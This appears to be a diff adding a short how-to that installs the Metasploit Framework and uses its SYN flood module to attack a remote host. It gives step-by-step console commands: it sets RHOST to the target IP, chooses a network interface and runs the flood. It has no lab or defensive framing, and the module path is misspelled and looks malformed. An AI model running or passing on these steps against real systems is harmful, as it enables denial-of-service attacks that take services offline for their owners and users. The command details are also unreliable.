@@ -1,0 +1,15 @@
+1. Download the metasploit framework from http://www.metasploit.com/download
+2. install metasploit:
+    # chmod +x metasploit-latest-linux-x64-installer.run
+    # ./metasploit-latest-linux-x64-installer.run
+
+3. run the metasploit console and load the synflood module
+    # msfconsole
+    msf > use auxilary/net/dos/tcp/synflood
+
+4. configure the synflood module to attack the remote system
+    msf > set RHOST [remote ip address]
+    msf > set INTERFACE [local network interface, eg. eth0]
+
+5. attack remote system
+    msf > exploit
